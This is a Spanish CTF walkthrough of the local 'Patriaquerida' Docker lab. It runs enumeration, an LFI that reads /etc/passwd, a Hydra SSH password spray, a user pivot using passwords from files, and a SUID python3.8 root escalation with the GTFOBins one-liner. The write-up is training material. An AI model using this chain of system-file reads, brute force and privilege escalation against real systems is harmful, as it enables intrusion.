*Autor:JuanR*
Levantamos el docker:
```bash
sudo bash auto_deploy.sh patriaquerida.tar 
```
y nos levanta la maquina víctima con la IP:172.17.0.2
##fase de enumeración

Lo primero es hacer un escaneo de puertos y servicios que corren en la maquina y lo exportamos a un archivo en formato 
nmap que se va a llamar PuertosYservicios:
```bash
sudo nmap -sS -sCV -Pn --min-rate 5000 -p- -vvv --open 172.17.0.2 -oN PuertosYservicios
```
```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e1:b8:ce:5c:65:5a:75:9e:ed:30:7a:2b:b2:25:47:6b (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDKkyizWSTER54TY7KZCdb8kueEQyUAKAqEkNN1VhJNU8DPLxemuQqP+jA6TPzXEOhjHkL9Oz2PY9OsWyCujEZIazOuNfJah1g+km+okxWB8N+5M/MyOJlUAS8RqXQpGk4pN/EizZ3HE5cudhLQKeRVgxvkUqlZrYCmJCDrL+dWKQ4CPrTkQMCPGbZEl34/s/k1/jvGe0VqjcUkm58vZcudWE5QHTV3ERRJOmVMxNqNX76Dw6qLQE4u5IRfu1FxPV7AzK/G2I8ePSJF/fMEmFM9uQmjrfNWGvZOAR2OoewYi2uWUsdeoWuEHLOP1qcvx1ufN594Ldk6/QghmTo+8a/3XhWiROUZrt4cfYcChls47m/IDVVkiRmqNamRy4xNt0R1NYf/TUu8YpC6SqAI/6AoVV5L60NtxQgyNDJF1fxftooj0yrnoOZdqxhpikw22TdDuIy40X+jW8LTkmNk40s7xNi7bVuxedht1KQc2k0JSpVsMkBxDo29XYvEe0+kAyU=
|   256 a3:78:9f:44:57:0e:15:4f:15:93:59:d0:04:89:a9:f4 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJNO/pg+LjKvQ6IT2SMLSJx18e8aLMbYhtSmYNbrXaYurwIHY+Hlv9XfKyM6B0nSxCsbcczFTTmnaiFp6o4pVE8=
|   256 5a:7a:89:3c:ed:da:4a:b4:a0:63:d3:ba:04:39:c3:a4 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHlgHdpwW9DEFpCur7zj9irE/H4BUsFVUUSlJf5eOwKh
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
```
Vemos que tiene dos puertos abiertos:
-Puerto 22 ssh de versión 8.2 no vulnerable y sin user ni pass

-puerto 80 http

Como con el 22 ahora por SSH no podemos hacer nada nos centramos en el 80, pero antes de ir a la pagina web hago un whatweb:
```bash
whatweb 172.17.0.2 -v | tee whatweb
```
pipeandolo y con tee aprovecho para guarda la salida en un archivo de nombre whatweb

nos da esta salida:
```
WhatWeb report for http://172.17.0.2
Status    : 200 OK
Title     : Apache2 Ubuntu Default Page: It works
IP        : 172.17.0.2
Country   : RESERVED, ZZ

Summary   : Apache[2.4.41], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)]

Detected Plugins:
[ Apache ]
        The Apache HTTP Server Project is an effort to develop and 
        maintain an open-source HTTP server for modern operating 
        systems including UNIX and Windows NT. The goal of this 
        project is to provide a secure, efficient and extensible 
        server that provides HTTP services in sync with the current 
        HTTP standards. 

        Version      : 2.4.41 (from HTTP Server Header)
        Google Dorks: (3)
        Website     : http://httpd.apache.org/

[ HTTPServer ]
        HTTP server header string. This plugin also attempts to 
        identify the operating system from the server header. 

        OS           : Ubuntu Linux
        String       : Apache/2.4.41 (Ubuntu) (from server string)

HTTP Headers:
        HTTP/1.1 200 OK
        Date: Wed, 15 Jan 2025 14:35:43 GMT
        Server: Apache/2.4.41 (Ubuntu)
        Last-Modified: Sun, 12 Jan 2025 12:14:22 GMT
        ETag: "2aa6-62b81449a4380-gzip"
        Accept-Ranges: bytes
        Vary: Accept-Encoding
        Content-Encoding: gzip
        Content-Length: 3138
        Connection: close
        Content-Type: text/html
```
nada relevante, parece que es la página que trae por defecto el servidor apache, pues nos vamos al navegador y miramos el código fuente
de la página, por si hay algún dato relevante
```
con firefox son las teclas ctrl+u
```
No encuentro nada, procedo a realizar un fuzzing y ver que rutas tiene este servidor:
```bash
 feroxbuster -u "http://172.17.0.2/" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -o feroxbuster  
 ```
 *explicación:*
 -u: para indicar la url
 -w: para indicar el wordlist o diccionario que vamos a utilizar
 -x: para indicar las extensiones
 -o: para exportar el reultado a un archivo

 ```
http://172.17.0.2/icons/ubuntu-logo.png
http://172.17.0.2/index.php
http://172.17.0.2/index.html
```
##fase de intrusión
tres rutas, vamos a comprobarlas, empezamos por http://172.17.0.2/index.php:
y vemos que nos pone esto:
```
Bienvenido al servidor CTF Patriaquerida.¡No olvides revisar el archivo oculto en /var/www/html/.hidden_pass!
```
pues provamos la ruta
```
http://172.17.0.2/.hidden_pass
```
y vemos esto:
```
balu
```

tenemos un pass pero nos falta un user, probé a realizar fuerza bruta sin éxito, asi pues me centré en el php.
Un posible LFI?, así que realice un fuzz:
```bash
 wfuzz -c --hc=404 --hh=109 -w /usr/share/wordlists/dirb/big.txt  'http://172.17.0.2/index.php?FUZZ=/etc/passwd'
```
```
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://172.17.0.2/index.php?FUZZ=/etc/passwd
Total requests: 20469

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                     
=====================================================================

000013354:   200        26 L     36 W       1367 Ch     "page"
```
bueno parece ser que por ahí van los tiros
```bash
http://172.17.0.2/index.php?page=/etc/passwd
```
inserto eso en el buscador y tengo acceso al /etc/passwd (lo leo en el codigo fuente que está mas ordenadito)
```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:105::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
pinguino:x:1000:1000::/home/pinguino:/bin/bash
mario:x:1001:1001::/home/mario:/bin/bash
```
me hago un diccionario con los user, quedandome así:
```
root
www-data
gnats
messagebus
pinguino
mario
```
y hago fuerzabruta con este diccionario y el pass balu
```bash
hydra -L user.txt  -p balu -t 16 -V -f -I ssh://172.17.0.2
```
*explicación:*
-L: mayúsculas para indicar que usamos un diccionario en este caso user.txt que esta en el directorio donde trabajo
-p: minúscula para indicar que usamos como pass esa palabra y no un diccionario
-t 16: hilos, tareas en paralelo 16 peticiones
-V: modo verbose para ver por pantalla lo que está haciendo
-f: detiene el ataque cuando encuentra una combinación valida
-I: para desactivar el tiempo de espera inicial (creo recordar que dos segundos)

```[ATTEMPT] target 172.17.0.2 - login "root" - pass "balu" - 1 of 6 [child 0] (0/0)
[ATTEMPT] target 172.17.0.2 - login "www-data" - pass "balu" - 2 of 6 [child 1] (0/0)
[ATTEMPT] target 172.17.0.2 - login "gnats" - pass "balu" - 3 of 6 [child 2] (0/0)
[ATTEMPT] target 172.17.0.2 - login "messagebus" - pass "balu" - 4 of 6 [child 3] (0/0)
[ATTEMPT] target 172.17.0.2 - login "pinguino" - pass "balu" - 5 of 6 [child 4] (0/0)
[ATTEMPT] target 172.17.0.2 - login "mario" - pass "balu" - 6 of 6 [child 5] (0/0)
[22][ssh] host: 172.17.0.2   login: pinguino   password: balu
[STATUS] attack finished for 172.17.0.2 (valid pair found)
```
pues ya tenemos user y pass para ssh pinguino:balu
##fase escalada
entramos desde ssh:
```bash
ssh pinguino@172.17.0.2
´´´
con el pass "balu", ya estamos dentro.

Miramos que hay en nuestro home
```bash
ls -la
```
```
drwxr-xr-x 1 pinguino pinguino 4096 Jan 16 16:28 .
drwxr-xr-x 1 root     root     4096 Jan 12 22:38 ..
-rw-r--r-- 1 pinguino pinguino  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 pinguino pinguino 3771 Feb 25  2020 .bashrc
drwx------ 2 pinguino pinguino 4096 Jan 16 16:28 .cache
-rw-r--r-- 1 pinguino pinguino  807 Feb 25  2020 .profile
-rw------- 1 pinguino pinguino   43 Jan 12 22:38 nota_mario.txt
```
abrimos nota_mario.txt
```bash
cat nota_mario.txt
```
```
La contraseña de mario es: invitaacachopo
```
parece que tenemos la contraseña del usuario Mario, si miramos el passwd
```bash
cat /etc/passwd | grep sh$
```
```
root:x:0:0:root:/root:/bin/bash
pinguino:x:1000:1000::/home/pinguino:/bin/bash
mario:x:1001:1001::/home/mario:/bin/bash
```
aparte de pinguino que tengan shell (de ahi el  | grep sh$ de arriba) solo está mario y root
##pivotamos a usuario mario
```bash
su mario
```
e introducimos la contraseña del usuario que habíamos encontrado (invitaacachopo)
siendo ya mariorevisando todo un poco al final miro si tenemos permisos suid
```bash
find / -perm -4000 2>/dev/null
```
```
/usr/bin/chfn
/usr/bin/man
/usr/bin/passwd
/usr/bin/su
/usr/bin/mount
/usr/bin/umount
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/python3.8
/usr/bin/sudo
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```
entre ellos vemos /usr/bin/python3.8
vamos a nuestra querida página de vulnerabilidades en binarios:
```bash
https://gtfobins.github.io/gtfobins/python/#suid
```
```
./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```
lo ajustamos un poco a nuestras necesidades, quedando así:
```bash
/usr/bin/python3.8 -c 'import os; os.execl("/bin/bash", "bash", "-p")'
```
y ya somos root
